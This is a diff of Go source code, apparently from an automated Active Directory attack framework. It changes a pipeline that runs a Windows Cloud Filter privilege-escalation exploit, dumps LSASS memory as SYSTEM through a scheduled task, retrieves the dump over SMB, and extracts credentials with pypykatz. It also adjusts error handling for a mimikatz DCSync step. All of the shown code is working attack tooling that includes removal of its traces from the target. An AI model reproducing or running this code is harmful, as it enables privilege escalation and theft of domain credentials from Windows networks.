+	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_eop_%d.dmp`, time.Now().UnixNano())
+	defer func() {
+		_ = tools.CleanupRemote(ctx, target, append(depPaths, exploitPath, dumperPath, dumpRemote)...)
+	}()
 
-		ts := time.Now().Unix()
-		remotePath := fmt.Sprintf(`C:\Windows\Temp\lsass_eop_%d.dmp`, ts)
-		dumpCmd := fmt.Sprintf(
-			`schtasks /create /tn "MiniDump" /tr "C:\Windows\Temp\nanodump.exe --write %s --fork" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn "MiniDump" && ping -n 6 127.0.0.1 >NUL && schtasks /delete /tn "MiniDump" /f`,
-			remotePath)
-		tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
+	fmt.Printf("[*] MiniPlasma: Executing Cloud Filter EoP exploit (sha256:%s…)...\n", tools.ShortHash(expSha, 16))
+	execR, err := tools.NetExec.RunFailover(ctx, target, exploitPath, 60*time.Second)
+	if err != nil || !execR.Success {
+		fmt.Println("[!] MiniPlasma exploit did not return success")
+		result.Success = false
+		return result
+	}
 
-		fmt.Println("[*] MiniPlasma: Retrieving SYSTEM-level dump via SMB...")
-		getR, err := tools.NetExec.GetFile(ctx, target, remotePath, "/tmp/")
-		if err == nil && getR.Success {
-			dumpName := fmt.Sprintf("lsass_eop_%d.dmp", ts)
-			localPath := "/tmp/" + dumpName
-			fmt.Println("[*] MiniPlasma: Parsing dump with pypykatz...")
-			pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
-			if pyr.Success {
-				creds := pipeline.ParseFn(pyr.Stdout)
-				result.Creds = append(result.Creds, creds...)
-				for _, c := range creds {
-					result.Evidence = append(result.Evidence, core.EvidenceEntry{
-						Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-						Source: "miniplasma", Key: c.Username + "@" + c.Domain,
-						Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
-						Timestamp: time.Now(),
-					})
-				}
+	fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS as SYSTEM via schtasks...")
+	dumpCmd := fmt.Sprintf(
+		`schtasks /create /tn "MiniDump" /tr "%s --write %s --fork" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn "MiniDump" && ping -n 6 127.0.0.1 >NUL && schtasks /delete /tn "MiniDump" /f`,
+		dumperPath, dumpRemote)
+	execDumpR, errDump := tools.NetExec.RunFailover(ctx, target, dumpCmd, 90*time.Second)
+	if errDump != nil || !execDumpR.Success {
+		fmt.Printf("[!] MiniPlasma: schtasks dump failed (err=%v)\n", errDump)
+		result.Success = false
+		return result
+	}
+
+	fmt.Println("[*] MiniPlasma: Retrieving SYSTEM-level dump via SMB...")
+	localDump := fmt.Sprintf("/tmp/lsass_eop_%d.dmp", time.Now().UnixNano())
+	if getR, gerr := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump); gerr == nil && getR.Success {
+		fmt.Println("[*] MiniPlasma: Parsing dump with pypykatz...")
+		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
+		if pyr.Success {
+			creds := pipeline.ParseFn(pyr.Stdout)
+			result.Creds = append(result.Creds, creds...)
+			for _, c := range creds {
+				result.Evidence = append(result.Evidence, core.EvidenceEntry{
+					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+					Source: "miniplasma", Key: c.Username + "@" + c.Domain,
+					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
+					Timestamp: time.Now(),
+				})
 			}
 		}
-
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "miniplasma", Key: "eop",
-			Value:      "MiniPlasma SYSTEM shell achieved",
-			Confidence: 0.7, RawOutput: execR.Stdout,
-			Timestamp: time.Now(),
-		})
 	}
+
+	result.Evidence = append(result.Evidence, core.EvidenceEntry{
+		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+		Source: "miniplasma", Key: "eop",
+		Value:      "MiniPlasma SYSTEM shell achieved (sha256:" + tools.ShortHash(expSha, 16) + ")",
+		Confidence: 0.7, RawOutput: execR.Stdout,
+		Timestamp: time.Now(),
+	})
 	return result
 }
 
@@ -1142,12 +1264,26 @@ func executeDCSyncPipeline(state *core.ADState, _ core.Host, _ PipelineDef) *cor
 			},
 		}
 		r, err := tools.GoMimikatz.SekurlsaDcsync(ctx, req)
-		if err != nil || !r.Success {
+		if err != nil {
 			fmt.Printf("[!] DCSync failed for %s\\%s: %v\n", c.Domain, c.Username, err)
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 				Source: "dcsync", Key: c.Username + "@" + c.Domain,
-				Value: "DCSync failed", Confidence: 0.5, RawOutput: r.Stdout,
+				Value: "DCSync failed: " + err.Error(), Confidence: 0.5,
+				Timestamp: time.Now(),
+			})
+			continue
+		}
+		if r == nil || !r.Success {
+			fmt.Printf("[!] DCSync failed for %s\\%s: result unsuccessful\n", c.Domain, c.Username)
+			rawOut := ""
+			if r != nil {
+				rawOut = r.Stdout
+			}
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Source: "dcsync", Key: c.Username + "@" + c.Domain,
+				Value: "DCSync failed", Confidence: 0.5, RawOutput: rawOut,
 				Timestamp: time.Now(),
 			})
 			continue
